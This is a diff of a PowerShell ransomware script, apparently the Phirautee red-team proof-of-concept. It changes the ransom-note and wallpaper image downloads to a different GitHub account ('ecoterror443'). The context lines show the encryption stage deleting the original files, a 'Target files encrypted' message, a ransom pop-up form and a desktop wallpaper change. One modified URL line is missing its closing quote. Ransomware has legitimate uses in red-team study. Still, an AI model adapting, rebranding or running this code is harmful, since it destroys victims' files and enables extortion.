@@ -291,8 +291,8 @@ foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.
   rm $i
 }
 
-$alert = "https://raw.githubusercontent.com/Viralmaniar/Phirautee/master/defcon.jpg"
-Invoke-WebRequest -Uri $alert -OutFile "C:/temp/defcon.jpg"
+$alert = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/img.png
+Invoke-WebRequest -Uri $alert -OutFile "C:/temp/img.png"
 # Start-Sleep -s 2
 
 Write-Host "[+] Target files encrypted..." -ForegroundColor Green
@@ -339,7 +339,7 @@ $Form.StartPosition = "CenterScreen"
 $Form.FormBorderStyle = 'Fixed3D' 
 $Form.Text = "Project Red Team III" 
 
-$img = [System.Drawing.Image]::Fromfile('c:\temp\defcon.jpg')
+$img = [System.Drawing.Image]::Fromfile('c:\temp\img.png')
 $pictureBox = new-object Windows.Forms.PictureBox
 $pictureBox.Width = $img.Size.Width
 $pictureBox.Height = $img.Size.Height
@@ -408,16 +408,16 @@ Start-Sleep 1
 $delay -= 1	  
 }
 $Form.Close()
-$background = "https://raw.githubusercontent.com/Viralmaniar/Phirautee/master/PhirauteeBackground-3.jpg"
-Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/PhirauteeBackground-3.jpg"
+$background = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/img.png"
+Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/img.png"
 # Start-Sleep -s 2
 <#
 #Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name WallPaper -value ''
 New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImageStatus" -Value "1" -PropertyType DWORD -Force | Out-Null
-New-ItemProperty -Path "HKCU:\Control Panel\Personalization"-Name "DesktopImagePath" -Value "/users/$env:USERNAME/PhirauteeBackground-3.jpg" -PropertyType STRING -Force | Out-Null
-New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImageUrl" -Value "/users/$env:USERNAME/PhirauteeBackground-3.jpg" -PropertyType STRING -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Control Panel\Personalization"-Name "DesktopImagePath" -Value "/users/$env:USERNAME/img.png" -PropertyType STRING -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImageUrl" -Value "/users/$env:USERNAME/img.png" -PropertyType STRING -Force | Out-Null
 #>
-$wallpaper = "C:/users/$env:USERNAME/PhirauteeBackground-3.jpg"
+$wallpaper = "C:/users/$env:USERNAME/img.png"
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
 # Start-Sleep -s 2
